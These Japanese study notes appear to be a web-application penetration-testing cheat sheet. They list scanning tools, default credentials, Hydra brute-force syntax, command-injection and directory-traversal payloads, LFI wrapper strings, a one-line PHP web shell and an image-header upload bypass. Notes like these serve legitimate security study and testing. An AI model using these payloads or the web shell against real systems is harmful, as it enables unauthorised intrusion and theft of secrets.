# ***<span style="color:blue;">脆弱性を発見するまでの流れ</span>***
１　webサーバが稼働しているポートを探す(80,443以外にも)  
２　webサーバ自体に脆弱性がないか調査する  
３　webアプリが動作しているURLを調査する  
４　webアプリのパブリッシュエクスプロイトがないか調査する  
５　認証がある場合はログイン出来ないか試す  
６　悪用できる機能がないか調査する  
# ***<span style="color:blue;">webサーバの脆弱性調査</span>***
- nmapなどからわかったバージョンについて検索をする
- httpヘッダからバージョンを確認・調査
- niktoを用いた自動スキャン   
```
$ nikto -h http://<IP>:<port>
```   
# ***<span style="color:blue;">既知の脆弱性の調査</span>***
- exploitdb内のexploitがないか調査   
```
$ searchsploit <app & verdion>
```
- PoCはgithub上で公開されていることが多い   
```
<app><verdion> exploit github [検索]
```
- プラグインやフレームワークがある場合はそれについても調査   
```
$ wpscan -url <url> -enumerate u,ap
```   
- ソースコードにアプリ名が記載されていることがある   
-- ライブラリやプラグイン、バージョンなども
# ***<span style="color:blue;">認証の突破</span>***
- 簡単なクレデンシャルを試す   
	- admin:admin
	- admin:password
	- root:root
	- root:toor
	- root:password
- デフォルトクレデンシャル(インストール時に使う）を試す   
```
<app>default credential [検索]
```
- ブルートフォース   
	- ツールを用いてワードリストを作成可能   
```
cewl <url>    
hydra -l admin -P <wordlists> http://<IP>:<port> http-post-form '<path>:<data>:<error>'
```   
- SQLインジェクション(' or 1=1 --)   
# ***<span style="color:blue;">機能の列挙</span>***
- ユーザ登録機能がある場合は登録してから行う
- 検索機能　→　SQLインジェクン   
	- 認証がSQLインジェクションで突破できた場合は特に
- OSコマンドの実行機能　→　OSコマンドインジェクション
- ファイルのダンロード機能　→　ディレクトリトラバーサル
- ファイルの読み込み・実行機能　→　Remoto File Includion /LFI
- ファイルアップロード機能　→　Arbitrary File upload  
# ***<span style="color:blue;">SQLインジェクション</span>***
- 基本的にパスワード（ハッシュ）のダンプを目標とする
- データベースによっては直接RCEも
- Union-base SQL Injekutionが多い  
# ***<span style="color:blue;">OSコマンドインジェクション</span>***
- Remote Code Executionが目標
- urlのクエリやpostリクエストのデータの中身から推測   
	- Burp suiteが活躍する
- ；や&&を使ってRCEを達成する   
	- 使えるコマンドのホワイトリストや記号のブラックリストも
```
hoge;ls
hoge && ls
hoge | ls 
hoge || ls
hoge 'ls'
hoge $(ls)
hoge%0Acat%20 /etc/passwd
```
# ***<span style="color:blue;">ディレクトリトラバーサル</span>***
- 秘密情報の窃取が目標
- ファイルの読み込み機能やダウンロード機能から   
	- ファイル名を変更する
- ../を用いて本来であれば読み込めないファイルを読み取る   
	- webアプリの設定ファイルなどを読み取る
	- ディレクトリトラバーサルが可能かどうあか確認するためにファイル   
```
../../../../etc/passwd   
../../../../windows/win.ini
```
# ***<span style="color:blue;">RFI／Local File Inclusion</span>***
- RCEもしくは秘密情報の窃取が目標
- ファイルのイングルード機能を悪用する
- RFIが出来る場合はそのままRCE   
```
<?php system($_GET['cmd']);?>
```
- LFIの場合はファイルを読み取ったりphp wrapperを使う   
```
php://filter/convert.base64-encode/resource=index.php   
php://input
```   
# ***<span style="color:blue;">Arbitrary File Upload</span>***
- RCEが目標
- ファイルのアップロード機能を悪用    
	- アップロード先がアクセス可能な場合はweb shellの設置が可能
- フィルターのバイパス   
	- 拡張子やファイルヘッダ、ファイルサイズなどの制限があることがある
```
$ head -c 20 test.jpg > test   
$ cat test shell.php > bypass.php   
Content-Type:image/png
Content-Type:image/jpeg
```